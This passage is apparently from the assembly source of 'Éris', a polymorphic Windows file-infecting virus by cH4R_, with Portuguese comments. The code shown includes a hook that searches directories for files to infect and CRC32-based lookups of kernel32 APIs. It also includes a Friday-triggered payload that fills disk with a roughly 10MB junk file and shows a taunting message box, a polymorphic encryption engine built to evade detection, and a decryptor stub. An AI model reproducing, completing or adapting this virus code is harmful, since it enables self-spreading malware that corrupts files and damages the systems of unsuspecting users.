   mov ebx,edi                    ; EBX = EDI
   xor al,al                      ; AL = 0
   cld                            ;
   @scan_str:                     ;
   scasb                          ;
   jnz @scan_str                  ;
   dec edi                        ; EDI--

   ; Acha ultima barra do diretório...

   mov al,"\"                     ; AL = 5Ch
   std                            ;
   @scan_str2:                    ;
   cmp edi,ebx                    ; EDI = EBX ?
   jz hook_fim                    ; Então vaza pq não tem barra...
   scasb                          ;
   jnz @scan_str2                 ;
   inc edi                        ; EDI++
   sub edi,ebx                    ; EDI = EDI - EBX

   mov [ebp+busca-delta],ecx      ; Salva ECX !
   xchg edi,ecx                   ; EDI = ECX
   add edi,414h                   ; EDI+= 414h
   push edi                       ; EDI na stack...
   mov esi,ebx                    ; ESI = EBX
   cld                            ;
   rep movsb                      ; Copia...

   inc edi
   push edi                       ; EDI na stack...
   push 104h
   api GetCurrentDirectoryA

   api SetCurrentDirectoryA       ; Seta diretório...

   push edi
   call BuscaCDIR                 ; Busca arquivos no diretório...
   api SetCurrentDirectoryA       ; Seta diretório...
   call LiberaW32FD               ; Libera memoria usada...

   hook_fim:                      ;
   popfd                          ; Recupera flags...
   popad                          ; Recupera flags...
   ret                            ; Executa API...


   ; *** PegaIAT -> Adaptado do tutorial de Billy Belcebu ***
   ; *** PegaIAT -> Adapted from Billy Belcebu tutorials  ***

   PegaIAT proc

   mov dwo [ebp+FH-delta],eax                ; Save API CRC32 for later
   mov esi,dwo [ebp+baseaddr-delta]          ; ESI = imagebase
   add esi,3Ch                               ; Get ptr to PE header
   lodsw                                     ; AX = That pointer
   cwde                                      ; Clear MSW of EAX
   add eax,dwo [ebp+baseaddr-delta]          ; Normalize pointer
   xchg esi,eax                              ; ESI = Such pointer
   lodsd                                     ; Get DWORD
   cmp eax,"EP"                              ; Is there the PE mark?
   jnz nopes                                 ; Fail... duh!
   add esi,7Ch                               ; ESI = PE header+80h
   lodsd                                     ; Look for .idata
   push eax
   lodsd                                     ; Get size
   mov ecx,eax
   pop esi
   or esi,esi                                ; ESI = 0 ?
   jz nopes                                  ; Então vaza pq nao tem IAT...
   add esi,dwo [ebp+baseaddr-delta]          ; Normalize

   SearchK32:
   push esi                                  ; Save ESI in stack
   mov esi,[esi+0Ch]                         ; ESI = Ptr to name
   add esi,dwo [ebp+baseaddr-delta]          ; Normalize
   mov edi,04895FCC3h                        ; CRC of 'KERNEL32'
   push 08h                                  ; Size of string
   push esi                                  ;
   call CRC32                                ; Calculate CRC32
   cmp eax,edi                               ;
   pop esi                                   ; Restore ESI
   jz gotcha                                 ; Was it equal? Damn...
   add esi,14h                               ; Get another field
   jmp SearchK32                             ; And search again

   gotcha:
   cmp byte ptr [esi],00h                   ; Is OriginalFirstThunk 0?
   jz nopes                                 ; Damn if so...
   mov edx,[esi+10h]                        ; Get FirstThunk
   add edx,dwo [ebp+baseaddr-delta]         ; Normalize
   lodsd                                    ; Get it
   or eax,eax                               ; Is it 0?
   jz nopes                                 ; Damn...

   xchg edx,eax                             ; Get pointer to it
   add edx,[ebp+baseaddr-delta]
   xor ebx,ebx

   loopy:
   cmp dword ptr [edx],0h              ; Last RVA?
   jz nopes                            ; Damn...
   cmp byte ptr  [edx+03h],80h         ; Ordinal?
   jz reloop                           ; Damn...
   mov edi,[edx]                       ; Get pointer of an imported API
   add edi,dwo [ebp+baseaddr-delta]
   inc edi
   inc edi
   mov esi,edi                         ; ESI = EDI
   pushad                              ; Save all regs
   eosd:
   xor al,al
   scasb
   jnz eosd
   sub edi,esi                         ; EDI = API size
   dec edi
   push edi
   push esi
   call CRC32
   mov [esp+18h],eax                   ; Result in ECX after POPAD
   popad
   cmp dwo [ebp+FH-delta],ecx          ; Is the CRC32 of this API
   jz wegotit                          ; equal as the one we want?

   reloop:
   inc ebx                             ; If not, loop and search for
   add edx,4                           ; another API in the IT
   loop loopy

   wegotit:
   shl ebx,2                           ; Multiply per 4
   add ebx,eax                         ; Add FirstThunk
   mov eax,[ebx]                       ; EAX = API address
   clc                                 ; Clear Carry
   db 0B1h                             ; Overlap: avoid STC :)

   nopes:
   stc                                 ; Set Carry
   ret

   PegaIAT endp

   ; -----------------------------------------------------------------
   ;            Payload
   ; -----------------------------------------------------------------

   Payload proc

   sub esp,SZ_SYSTEMTIME      ; Reserva stack...
   mov eax,esp                ; EAX = Ponteiro reservado da stack

   push eax                   ; Salva EAX!
   push eax                   ; Endereço para armazenar SYSTEMTIME
   api GetSystemTime          ; Pega system time...
   pop eax                    ; Recupera EAX!

   add esp,SZ_SYSTEMTIME      ; Libera stack...
   movzx edi,[eax.wDayOfWeek] ; EDI = DayOfWeek
   sub edi,5                  ; EDI = EDI - 5
   jnz payload_fim            ; Nhe.. num é hj :(

   sexta_feira:
   xor eax,eax          ;
   push eax             ;
   push eax             ;
   push CREATE_NEW      ;
   push eax             ;
   push eax             ;
   push GENERIC_WRITE   ;
   call nome_bomba      ;
   db "MSBSD.XP .386",0 ; :P
   nome_bomba:          ; Poxa tio Bill, cria vergonha nessa cara... rs.
   pop ebx              ;
   call rnd_ch          ;
   mov [ebx+6],al       ;
   call rnd_ch          ;
   mov [ebx+7],al       ;
   call rnd_ch          ;
   mov [ebx+8],al       ;
   push ebx             ;
   api CreateFileA      ;
   inc eax              ;
   jz sexta_feira       ;
   dec eax              ;

   mov edi,eax          ; EDI = EAX
   xor eax,eax          ; EAX = 0
   push PAGE_READWRITE  ; Protect
   push MEM_COMMIT_RESERVE ; AllocationType
   push 0AFFFFFh        ; Size
   push eax             ; Address
   api VirtualAlloc
   or eax,eax           ; EAX = 0 ?
   jz payload_fim       ; Então vaza...
   xchg eax,ebx         ;

   mov [ebx],marca

   push edi            ; [Handle]
   xor eax,eax         ; EAX = 0
   push MEM_RELEASE    ; FreeType
   push eax            ; Size
   push ebx            ; Address
   push 100000h        ;
   call rand           ;
   xchg eax,ecx        ;
   add ecx,0A00000h    ;
   xor eax,eax         ; EAX = 0
   push eax            ;
   call payload_bwr    ; byteWritten
   dd 0                ;
   payload_bwr:        ;
   push ecx            ; 10mb
   push ebx            ; Ponteiro para memoria...
   push edi            ; FileHandle
   api WriteFile       ; escreve...

   api VirtualFree     ; Libera memória...

   api CloseHandle     ; Fechar arquivo...

   call @@user32        ;
   db "USER32",0        ;
   @@user32:            ; USER32.DLL
   api LoadLibraryA     ; carrega...

   push eax             ; Salva eax !

   call @@msgbox        ; "MessageBoxA"
   db "MessageBoxA",0
   @@msgbox:
   push eax             ; Handle
   api GetProcAddress   ; pega endereço...

   xor ebx,ebx                ; EBX = 0
   push 10h                   ; MB_ICONERROR
   call @@title               ; titulo
   db "Éris - by cH4R_",0     ;
   @@title:                   ;
   call @@text                ; texto
   db 22h                     ;
   db " Nada é verdadeiro,"   ;
   db " tudo é permitido. "   ;
   db 22h,0                   ;
   @@text:                    ;
   push ebx                   ; hWnd
   call eax                   ; MessageBoxA

   api FreeLibrary  ; Descarrega DLL

   payload_fim:
   ret              ; Retorna...

   rnd_ch:
   push 1Ch         ; 28 possibilidades
   call rand        ;
   add al,40h       ; ASCII - de "@" a "["
   ret              ;

   Payload endp

   ; -----------------------------------------------------------------
   ;  Função que coordena o polimorfismo e a criptografia na infecção
   ; -----------------------------------------------------------------
   ; Entrada:
   ; EAX = Area do arquivo mapeado onde os codigos de criptografia entrarão

   Crypt_Poly proc
   pushad                     ; Salva registradores...

   push eax                   ; Salva EAX
   call Cria_Genotipo         ; Cria um genótipo de polimorfismo
   pop eax                    ; Recupera EAX
   call Cria_Fenotipo         ; Gera um fenótipo baseado no genótipo, obvio...

   push edi                   ; Salva EDI
   mov ecx,n_Comp             ; ECX = Tamanho do decriptador complexo
   push ecx                   ; Salva ECX
   lea esi,[ebp+DeCrypt-delta]; ESI = Inicio do decriptador complexo
   cld                        ; Direção de ESI
   rep movsb                  ; Copia...

   pop ecx                    ; Recupera ECX
   pop esi                    ; Recupera EDI em ESI
   mov eax,[esi-5]            ; EAX = [ESI-5]
   cmp al,04h                 ; AL = 4 ?
   jnz @@ok                   ; Senão pode pular esta parte...
   mov eax,[esi-6]            ; Se é, então lê um pouco mais...
   @@ok:                      ;
   or al,al                   ;
   jz @@sub                   ; É ADD ? Poe SUB
   sub al,10h                 ;
   jz @@sbb                   ; É ADC ? Poe SBB
   sub al,8                   ;
   jz @@adc                   ; É SBB ? Poe ADC
   sub al,10h                 ;
   jz @@add                   ; É SUB ? Poe ADD

   @@xor:                     ; Se não foi nada, então é xor.
   add al,28h                 ; Deixa como xor mesmo...
   jmp @@wr_enc               ;

   @@sub:                     ; Muda pra SUB
   mov al,28h                 ;
   jmp @@wr_enc               ;

   @@sbb:                     ; Muda pra SBB
   mov al,018h                ;
   jmp @@wr_enc               ;

   @@adc:                     ; Muda pra ADC
   mov al,010h                ;
   jmp @@wr_enc               ;

   @@add:                     ; Muda pra ADD
   xor al,al                  ;

   @@wr_enc:                         ;
   mov bye [ebp+e_instruc-delta],al  ; Altera instrução
   xchg edx,eax                      ; Troca EAX com EDX
   mov bye [ebp+e_mod2-delta],bl     ; Poe um modificador
   rcl ebx,8                         ; Tem AAA ?
   jnc poe_nop                       ;
   mov bye [ebp+e_mod1-delta],037h   ; opcode de AAA
   jmp rcX_def                       ;
   poe_nop:                          ;
   mov bye [ebp+e_mod1-delta],090h   ; opcode de NOP
   rcX_def:                          ;
   rcl ebx,1                         ; RCL ou RCR ?
   jnc poe_rcl                       ;
   mov bye [ebp+e_rcX-delta],0D8h    ; opcode de RCR
   jmp enc_loop                      ;
   poe_rcl:                          ;
   mov bye [ebp+e_rcX-delta],0D0h    ; opcode de RCL

   enc_loop:
   nop                         ; nop ou aaa
   e_mod1 = byte ptr $-1       ;
   xor eax,ecx                 ; xor edx,ecx
   e_rcX = byte ptr $+1        ;
   rcl eax,0FFh                ; rcl/rcr edx,modificador
   e_mod2 = byte ptr $-1       ;
   xor bye [esi+ecx-1],al      ; xor [codigo],chave
   e_instruc = byte ptr $-4    ;
   loop enc_loop               ; loop ;)

   popad               ; Recupera regs...
   ret                 ; Retorna...

   Crypt_Poly endp

   ; -----------------------------------------------------------------
   ;        Função que procura uma API na kernel pelo CRC32
   ; -----------------------------------------------------------------
   ; Entrada: EAX = CRC32 da API
   ; Saida: EAX = Endereço da API


   AchaAPI proc

   pushad               ; Salva todos os registradores

   mov ebx,eax          ; EBX = EAX
   xor eax,eax          ; EAX = 0

   mov esi,[ebp+kernel-delta] ; ESI = Endereço da kernel
   mov edi,esi          ; EDI = Endereço da kernel
   add esi,[esi+3Ch]    ; ESI = Cabeçalho PE

   mov ecx,[esi+78h]    ; Export directory
   add ecx,edi          ; Normaliza

   mov edx,[ecx].ED_AddressOfFunctions ; Endereço da tabela de RVA das funções
   push edx                            ; Salva na stack

   mov edx,[ecx].ED_AddressOfOrdinals  ; Endereço da tabela de ordinais
   push edx                            ; Salva na stack

   mov esi,[ecx].ED_AddressOfNames     ; Endereço da tabela de nomes
   add esi,edi                         ; Normaliza

   cdq                    ; Zera contador (EDX)
   dec edx                ; EDX --

   compara:
   lodsd                  ; Carrega ESI em EAX
   inc edx                ; Incrementa contador...
   pushad                 ; Salva registradores...

   xor edi,edi            ; EDI = 0
   add eax,[ebp+kernel-delta]   ; Normaliza EAX
   xchg edi,eax           ; Troca EAX com EDI
   mov ecx,edi            ; ECX = EDI (Ponteiro para o nome da API)
   tamanho:
   scasb                  ; (AL = [EDI]) Eh zero ?
   jnz tamanho            ; Se não continua..

   sub edi,ecx            ; EDI = EDI - ECX
   dec edi                ; EDI--
   push edi               ; Arg1 (tamanho da string)
   push ecx               ; Arg2 (ponteiro para o código)

   call CRC32             ; Calcula CRC32
   cmp eax,ebx            ; EBX = EAX ?

   popad                  ; Volta com registradores salvos

   jz achou_api           ; Se achou pula pra fora daqui

   jmp compara            ; Senão achou continua na rotina...

   achou_api:
   mov eax,[ebp+kernel-delta]; EAX = Kernel base
   xchg eax,edx              ; EAX = Contador & EDX = Kernel base
   pop esi                   ; ESI = Address Of Ordinals
   add esi,edx               ; Normaliza
   shl eax,1                 ; EAX = EAX * 2
   add eax,esi               ; EAX = Endereço do ordinal da API
   xor ecx,ecx               ; ECX = 0
   movzx ecx,wod [eax]       ; ECX = Ordinal da API
   pop edi                   ; EDI = Address of Functions
   shl ecx,2                 ; ECX = ECX * 4
   add ecx,edx               ; Normaliza
   add ecx,edi               ; ECX = Ponteiro para o endereço da API
   mov eax,[ecx]             ; EAX = Endereço da API
   add eax,edx               ; Normaliza

   achaapi_fim:
   mov [esp+STACK_REG._EAX],eax ; EAX na stack = EAX
   popad                        ; Recupera todos os registradores
   ret                          ; Retorna...

   AchaAPI endp

   ; -----------------------------------------------------------------
   ;    Lê tabela de kernels, manda checar e retorna kernel base
   ; -----------------------------------------------------------------
   ; Saida:
   ; EBX = Endereço da kernel
   ; EAX = Boolean (0 = ok, <>0 = erro)

   ProcuraKrn proc

   push 8                   ; Numero de endereços
   call pula_tabela         ; Salta tabela...

   dw 077E5h                ; WinXP (PROfessional)  \  NT 5.1 (BSD based ?)
   dw 077E6h                ; WinXP (Home Edition)  /

   dw 077F0h                ; WinNT/2K \
   dw 077EDh                ; WinNT/2K  \  NT 4 based
   dw 077E8h                ; WinNT/2K  /
   dw 077E0h                ; WinNT/2K /

   dw 0BFF6h                ; WinME      \  MS-DOS based ? lol ! :P
   dw 0BFF7h                ; Win95/98   /

   pula_tabela:
   pop esi                  ; ESI = Ponteiro para a tabela
   pop ecx                  ; ECX = 8

   le_checa:
   xor eax,eax              ; EAX = 0
   lodsw                    ; Carrega [ESI] em EAX
   rol eax,10h              ;
   mov ebx,eax              ; EBX = EAX
   call ChecaKrn            ; Checa se a kernel está neste endereço...
   or eax,eax               ; EAX = 0 ?
   jz achou_krn             ; Então achamos, vaza !
   loop le_checa            ; Senão checa denovo...

   achou_krn:
   ret                      ; Retorna...

   ProcuraKrn endp

   ; -----------------------------------------------------------------
   ;            Checa se a kenel está no endereço dado
   ; -----------------------------------------------------------------
   ; Entrada: EAX = Endereço
   ; Saida: EAX=0 (ok) / EAX<>0 (erro)

   ChecaKrn proc

   pushad                       ; Salva regs.

   pseh <jmp handler2>          ; Instala SEH
   cmp wod [eax],"ZM"           ; Tem assinatura MZ ?
   jnz handler2                 ; Senão vaza..
   add ebx,[eax+3Ch]
   cmp wod [ebx],"EP"           ; Tem assinatura PE ?
   jnz handler2                 ; Senão vaza..

   mov ecx,eax
   add eax,[ebx.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]
   add ecx,[eax.ED_Name]

   cmp [ecx],"NREK"             ; É a kernel ?
   jnz handler2                 ; Senão vaza...

   mov [esp+8+STACK_REG+_EAX],edx ; EAX na stack = 0

   handler2:                    ; Exception Handler
   rseh                         ; Remove SEH
   popad                        ; Recupera regs.
   ret                          ; Retorna...

   ChecaKrn endp

   ; -----------------------------------------------------------------
   ;                     Pega Delta-Offset
   ; -----------------------------------------------------------------

   infec_max db 0FFh      ; Maximo de infecções (1ª geração = FFh, outras = 6)
   kernel dd ?            ; Kernel base
   baseaddr dd 00400000h  ; Endereço base para o executavel original
   busca dd ?             ; Ponteiro para Win32_Find_Data na memoria
   SH dd ?                ; SearchHandle
   FH dd ?                ; FileHandle
   Mem dd ?               ; Ponteiro para mapa do arquivo na memoria
   sfc_func dd ?          ; Ponteiro para SfcIsFileProtected
   sfc_dll dd ?           ; Ponteiro para a DLL
   rndseed dd ?           ; Random seed
   host_org db 5 dup (0)  ; Backup do código original do hospedeiro

   Delta_Offset proc

   call delta             ;
   delta:
   jmp delta_fim          ; Salta para o fim da rotina...

   api_addrs label byte   ; Array de armazenamento de entrypoint de APIs
   CloseHandle dd ?
   CreateFileA dd ?
   CreateMutexA dd ?
   FindClose dd ?
   FindFirstFileA dd ?
   FindNextFileA dd ?
   FreeLibrary dd ?
   GetCurrentDirectoryA dd ?
   GetCurrentProcess dd ?
   GetDriveTypeA dd ?
   GetFileAttributesA dd ?
   GetModuleHandleA dd ?
   GetProcAddress dd ?
   GetSystemDirectoryA dd ?
   GetSystemTime dd ?
   GetVersionExA dd ?
   GetWindowsDirectoryA dd ?
   LoadLibraryA dd ?
   ReadFile dd ?
   SetCurrentDirectoryA dd ?
   SetFileAttributesA dd ?
   SetFilePointer dd ?
   VirtualAlloc dd ?
   VirtualFree dd ?
   VirtualProtect dd ?
   WriteFile dd ?
   WriteProcessMemory dd ?

   delta_fim:
   pop ebp
   ret

   Delta_Offset endp

   ; -----------------------------------------------------------------
   ;       Calcula CRC32, ajustado do código de Billy Belcebu
   ; -----------------------------------------------------------------
   ; Entrada:
   ; Arg1 = Ponteiro para string
   ; Arg2 = Tamanho da string
   ; Saida:
   ; EAX = CRC32 da String
   ;
   ; OBS: Eu sei, esta rotina é incrivelmente lenta e grande, mas não
   ; quis mudar nada dela, pois seria muito trabalho em cima de um código
   ; que admito não compreender completamente.

   CRC32 proc

   pushad          ; Salva regs.

   mov esi,[esp+STACK_REGS+4]    ; ESI = Ponteiro para string
   mov edi,[esp+STACK_REGS+8]    ; EDI = Tamanho da string

   cld             ; D=0 (mostra que ESI deve avançar)
   xor ecx,ecx     ;
   dec ecx         ; ECX = -1
   mov edx,ecx     ; EDX = -1

   NextByteCRC:

   xor eax,eax     ; EAX = 0
   xor ebx,ebx     ; EBX = 0
   lodsb           ; Carrega ESI em AL
   xor al,cl       ; XOR AL,CL
   mov cl,ch       ; CL = CH
   mov ch,dl       ; CH = DL
   mov dl,dh       ; DL = DH
   mov dh,8        ; DH = 8 (8 bits de AL)

   NextBitCRC:
   shr bx,1        ;
   rcr ax,1        ;
   jnc NoCRC       ;
   xor ax,08320h   ; XOR AX, MAGIC_1
   xor bx,0EDB8h   ; XOR BX, MAGIC_2

   NoCRC:
   dec dh          ; DH--
   jnz NextBitCRC  ; Tem mais bits ? Então continua...

   xor ecx,eax     ;
   xor edx,ebx     ;
   dec edi         ; EDI--
   jnz NextByteCRC ; Tem mais bytes ? Então continua...

   not edx         ;
   not ecx         ;
   mov eax,edx     ; EAX = EDX
   rol eax,10h     ;
   mov ax,cx       ; AX = CX

   mov [esp.STACK_REG._EAX],eax   ; Muda o EAX na stack..
   popad           ; Recupera regs..

   ret 8            ; Retorna...

   CRC32 endp

   ; -----------------------------------------------------------------
   ;     RGBLDE by roy g biv (original code / código original)
   ; -----------------------------------------------------------------
   ; Entrada:
   ; ESI = Ponteiro para o código
   ; Saida:
   ; EAX = Tamanho do código

   include RGBLDE.inc

   ; -----------------------------------------------------------------
   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
   ; -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
   ;
   ;               ELPE - Éris Low Polymorphic Engine
   ;
   ;                          by cH4R_
   ;
   ; -----------------------------------------------------------------
   ; -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
   ; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

   ; ---- Cria base para geração de codigo polimorfico ----

   Cria_Genotipo proc
   ; Saida:
   ; EBX = Genótipo

   ; Coleta números randomicos e gera um genótipo
   push 0FFh     ;
   call rand     ;
   mov ebx,eax   ;  G0 a G4
   rol ebx,8     ;
   push eax      ;

   push 0FFh     ;
   call rand     ;
   rcr eax,1     ;  G5
   jnc sem_g5    ;
   or ebx,1      ;
   sem_g5:       ;
   rol bl,7      ;

   push 5          ;
   call rand       ;
   push 7          ;
   pop ecx         ;
   rcl eax,18h     ;
   copia_bits:     ;
   rcl eax,1       ;  G6 e G7
   jnc sem_gen     ;
   or ebx,1        ;
   sem_gen:        ;
   ror bl,1        ;
   loop copia_bits ;
   rol ebx,8       ;

   pop eax       ;
   add bl,15     ;
   rcr eax,4     ;
   adc bl,0      ;  G8
   rcr eax,1     ;
   adc bl,0      ;
   sem_bit:      ;
   rol ebx,8     ;

   push 0FFh     ;
   call rand     ;  G9
   mov bl,al     ;

   ret    ; Retorna...

   Cria_Genotipo endp

   ; ---- Cria codigo polimorfico ----

   Cria_Fenotipo proc
   ; Entrada:
   ; EAX = Buffer
   ; EBX = Genótipo
   ; Saida:
   ; EAX = Inicio do codigo mutado
   ; EDI = Fim do codigo mutado
   ; EBX = Genótipo
   ; EDX = Chave de criptografia

   push eax         ; Salva EAX
   mov edi,eax      ; EDI = EAX

   mov eax,0609Ch   ; " PUSHFD / PUSHAD "
   stosw            ;

   mov eax,ebx      ; EAX = EBX
   push 2           ;
   pop ecx          ; ECX = 2
   rcl eax,4        ;
   sbb ecx,0        ;
   rcl eax,1        ;
   sbb ecx,0        ;
   sub edi,ecx      ;
   jecxz @prox1     ;
   dec ecx          ;
   jz @prox0        ;

   @inicio_poly:
   mov eax,09C90h   ; " NOP / PUSHFD "
   stosw            ;

   @prox0:
   push 6           ;
   call rand        ;

   call @trash      ;

   db 090h,0F8h
   db 0FCh,0FDh
   db 0F9h,09Eh

   @trash:          ;
   pop esi          ; ESI = Ponteiro para tabela de opcodes trash
   mov al,[esi+eax] ;
   mov ah,060h      ; " PUSHAD " + trash
   stosw            ;

   @prox1:
   mov al,0B9h      ; " MOV ECX, n_Comp "
   stosb            ;
   mov eax,n_Comp   ;
   stosd            ;

   mov esi,ebx      ; ESI = EBX
   rcl esi,1        ;
   jc @mod_ecx      ;
   jmp @no_mod      ;

   @mod_ecx:
   sub edi,4        ; EDI - 4
   call seed        ;
   xchg eax,ecx     ; ECX = Rand
   mov eax,n_Comp   ; EAX = n_Comp
   rcl esi,1        ;
   jnc @add_ou_sub  ;

   @xor_ou_or:      ;
   rcl esi,1        ;
   jc @or_          ;

   @xor_:           ;
   xor eax,ecx      ;  " MOV ECX,xx / XOR ECX,yy "
   stosd            ;
   mov ax,0F181h    ;
   stosw            ;
   mov eax,ecx      ;
   stosd            ;
   jmp @prox2       ;

   @or_:
   push eax         ;  " MOV ECX,0 / OR ECX,n_Comp "
   xor eax,eax      ;
   stosd            ;
   mov ax,0C981h    ;
   stosw            ;
   pop eax          ;
   stosd            ;
   jmp @prox2

   @add_ou_sub:
   rcl esi,1
   jc @sub_

   @add_:
   sub eax,ecx      ;  " MOV ECX,xx / ADD ECX,yy "
   stosd            ;
   mov eax,0C181h   ;
   stosw            ;
   mov eax,ecx      ;
   stosd            ;
   jmp @prox2       ;

   @sub_:
   add eax,ecx      ;  " MOV ECX,xx / SUB ECX,yy "
   stosd            ;
   mov eax,0E981h   ;
   stosw            ;
   mov eax,ecx      ;
   stosd            ;
   jmp @prox2

   @no_mod:            ;
   mov eax,090F8FCFDh  ;  TRASH
   stosd               ;
   mov ax,0F990h       ;  TRASH
   stosw               ;

   @prox2:
   mov al,0B8h         ;
   stosb               ;  " MOV EAX,chave "
   call seed           ;
   stosd               ;
   push eax            ;

   mov al,0E8h         ;
   stosb               ;
   xor eax,eax         ;
   mov esi,ebx         ;  " CALL @delta "
   rcl esi,4           ;
   adc eax,0           ;
   rcl esi,1           ;
   adc eax,0           ;
   stosd               ;

   xchg eax,ecx        ;  " TRASH / TRASH " (ou não...)
   jecxz @prox3        ;
   @trash_loop:        ;
   push 7Fh            ;
   call rand           ;
   stosb               ;
   loop @trash_loop    ;

   @prox3:             ;
   rcl esi,1           ;
   jc @edx_ou_edi      ;

   @esi_ou_ebx:        ;
   rcl esi,1           ;
   jc @ebx             ;

   @esi:               ;
   mov al,05Eh         ;  " POP ESI "
   jmp @escreve0       ;

   @ebx:               ;
   mov al,05Bh         ;  " POP EBX "
   jmp @escreve0       ;

   @edx_ou_edi:
   rcl esi,1
   jc @edx

   @edi:               ;
   mov al,05Fh         ;  " POP EDI "
   jmp @escreve0       ;

   @edx:               ;
   mov al,05Ah         ;  " POP EDX "

   @escreve0:
   stosb

   push eax            ; Precisaremos saber disso futuramente...

   add al,68h          ; (hehe, um truquezinho :P)
   mov ah,83h          ;
   xchg ah,al          ;
   stosw               ;  " ADD (DELTA-REG),(DISTANCIA)-1 "
   mov al,bh           ;
   dec al              ;
   stosb               ;

   rcl esi,1           ;
   pushfd              ; Precisaremos saber futuramente...
   jnc @prox4          ;
   mov al,037h         ;  " AAA "
   stosb               ;
   @prox4:             ;
   mov ax,0C133h       ;
   stosw               ;  " XOR EAX,ECX "

   mov al,0C1h         ;
   stosb               ;
   rcl esi,1           ;
   jnc @rcl_           ;  " RCL EAX,val "
   mov al,0D8h         ;
   jmp @val            ;
   @rcl_:              ;
   mov al,0D0h         ;  " RCR EAX,val "
   @val:               ;
   stosb               ;
   mov al,bl           ;
   stosb               ;

   rcl esi,1           ;
   jnc @nao_eh_xor     ;

   mov al,030h         ;
   jmp @escreve1       ;  " XOR "

   @nao_eh_xor:        ;
   rcl esi,1           ;
   jc @ADC_ou_SBB      ;

   @ADD_ou_SUB:        ;
   rcl esi,1           ;
   jc @2_sub           ;

   @2_add:             ;
   xor al,al           ;  " ADD "
   jmp @escreve1       ;

   @2_sub:             ;
   mov al,028h         ;  " SUB "
   jmp @escreve1       ;

   @ADC_ou_SBB:        ;
   rcl esi,1           ;
   jc @sbb_            ;

   @adc_:              ;
   mov al,010h         ;  " ADC "
   jmp @escreve1       ;

   @sbb_:              ;  " SBB "
   mov al,018h         ;

   @escreve1:
   mov ah,04           ;
   stosw               ;

   @prox_op:
   pop ecx             ;  ( POP (REG) é mais rápido do que POPFD )
   pop eax             ;
   push ecx            ;

   sub al,05Ah         ;
   jz @2_edx           ;
   dec al              ;
   jz @2_ebx           ;
   sub al,3            ;
   jz @2_esi           ;

   @2_edi:
   mov al,39h          ;  " XXX [ECX+EDI] "
   jmp @escreve2       ;

   @2_esi:
   mov al,31h          ;  " XXX [ECX+ESI] "
   jmp @escreve2       ;

   @2_ebx:
   mov al,19h          ;  " XXX [ECX+EBX] "
   jmp @escreve2       ;

   @2_edx:
   mov al,11h          ;  " XXX [ECX+EDX] "

   @escreve2:
   stosb               ;

   mov ax,0F6E2h       ;  " LOOP (DISTANCIA) "
   stosw               ;
   popfd               ;
   jc @muda_loop       ;
   mov al,090h         ;  Se não teve AAA então poe um NOP
   stosb               ;
   jmp @termina_poly   ;
   @muda_loop:         ;
   dec bye [edi-1]     ;

   @termina_poly:
   pop edx             ; Recupera chave...
   pop eax             ; Recupera EAX (Endereço do código mutado...)

   fim_fen:
   ret

   Cria_Fenotipo endp

   ; ---- Randomiza ----

   rand:
   push edx                       ; Salva EDX...
   mov eax,[ebp+rndseed-delta]    ; MOV EAX, SEED
   sbb eax,05F38h                 ; SBB EAX, 5F38 ( EAX = EAX - 5F38h - C )
   db 0D6h                        ; SALC ( Se C = 0, AL = 0 | Se C = 1, AL= 0FFh )
   imul edx                       ; IMUL EAX,EDX ( EAX = EAX * EDX )
   xor eax,edx                    ; XOR EAX,EDX
   xor [ebp+rndseed-delta],eax    ; XOR SEED, EAX
   xor edx,edx                    ; EDX = 0
   div dwo [esp+8]                ; EAX = EAX / [ESP-4]  (EDX = Resto)
   mov eax,edx                    ; EAX = EDX
   pop edx                        ; Recupera EDX...
   ret 4                          ; Retorna...

   ; ---- Gera semente para randomização ----

   seed:
   push edx                       ; Salva EDX !
   rdtsc                          ; RDTSC (pega time-stamp da cpu em EDX:EAX, 586+)
   xor edx,esp                    ; XOR EDX,ESP
   imul edx                       ; EAX = EAX * EDX
   xor eax,edx                    ; XOR EAX,EDX
   pop edx                        ; Recupera EDX !
   xor [ebp+rndseed-delta],eax    ; XOR SEED, EAX
   ret                            ; Retorna...

   Area_Fim label byte
   ; -----------------------------------------------------------------
   ;               Código que numca será encriptado
   ; -----------------------------------------------------------------

   ; -----------------------------------------------------------------
   ;         Rotina de descriptografia simples (polimorfica)
   ; -----------------------------------------------------------------
   ; OBS: Aqui você observa apenas uma "fôrma" para o código do decriptador,
   ; esta "fôrma" jamais será executada, apenas serviu como base para que
   ; que eu moldasse o engine de polimorfismo.


   S_Dec proc

               ; trash ou NÃO ?
   pushfd              ; PUSHFD ou PUSHAD
               ; trash ou NÃO ?
   pushad              ; PUSHAD ou TRASH

   mov ecx,n_Comp      ; ECX = Tamanho da area

   xor ecx,012345678h  ; Modificador de ECX
               ; ADD/XOR/SUB/OR imm32

   mov eax,012345678h  ; EAX = Chave 32 bits

   call @1             ; CALL [Distancia]
   nop                 ; TRASH ou não ?
   nop                 ; TRASH ou não ?
   @1:                 ;
   pop esi             ; POP [REG]
   add esi,7Fh         ; ADD [REG],[Distancia entre os codigos]

   loop_dec:

   aaa                 ; Modificador 1 (AAA) ou não ?
   xor eax,ecx         ; Modificador 2 (XOR)

   rcl eax,0FFh        ; Modificador 3 (RCL/RCR imm8)

   adc [esi+ecx],eax   ; Criptografia ADD/SUB/ADC/SBB/XOR [REG+ECX],EAX

   loop loop_dec       ; Loop

   S_Dec endp

   ; -----------------------------------------------------------------
   ;             Rotina de descriptografia complexa
   ; -----------------------------------------------------------------

   DeCrypt proc

   call delta0        ; Delta offset ;)
   delta0:            ;
   pop ebp            ;

   push 07Fh          ; Tamanho do buffer (maximo: 7Fh)
   k_tam = byte ptr $-1

   push 012345678h    ; Ponteiro para local de dados imutáveis
   k_buf = dword ptr $-4

   call Hash64        ; Calcula Hash64 em (EAX:EBX)...

   mov ecx,n_Area-4   ; ECX = Tamanho da area a ser decriptada

   dec_l:
   rcl eax,cl         ; RCL EAX,CL
   jnc no_dec         ; Bit = 0 ? Não decripta...
   xor dwo [ebp+ofs Area+ecx-delta0],eax  ; Decripta...
   no_dec:
   xor eax,ebx        ; XOR Chave, Modificador
   loop dec_l         ; Loop ;D

